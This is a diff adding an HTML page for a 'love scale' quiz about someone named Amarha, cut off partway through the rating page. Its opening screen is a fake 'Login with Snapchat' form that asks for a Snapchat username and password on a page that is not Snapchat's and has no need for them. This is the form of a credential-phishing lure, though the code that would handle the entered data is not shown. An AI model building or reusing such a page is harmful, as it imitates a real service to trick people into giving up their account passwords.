@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Amarha Love Scale</title>
+    <style>
+        body {
+            background: linear-gradient(45deg, #ff758c, #ff7eb3);
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: white;
+        }
+        .container {
+            margin-top: 100px;
+        }
+        input, button {
+            padding: 10px;
+            margin: 10px;
+            border: none;
+            border-radius: 5px;
+        }
+        button {
+            background: yellow;
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .page {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Login Page -->
+    <div id="loginPage" class="page active">
+        <div class="container">
+            <h1>Login with Snapchat</h1>
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Snapchat Username" required><br>
+                <input type="password" id="password" placeholder="Password" required><br>
+                <button type="submit">Log In</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Enter Name Page -->
+    <div id="namePage" class="page">
+        <div class="container">
+            <h1>Enter Your Name</h1>
+            <input type="text" id="name" placeholder="Your Name" required>
+            <button onclick="goToRating()">Next</button>
+        </div>
+    </div>
+
+    <!-- Love Rating Page -->
+    <div id="ratePage" class="page">
+        <div class="container">
+            <h1>How much do you love Amarha? ❤️</h1>
+            <input type="number" id="loveScale" min="1"
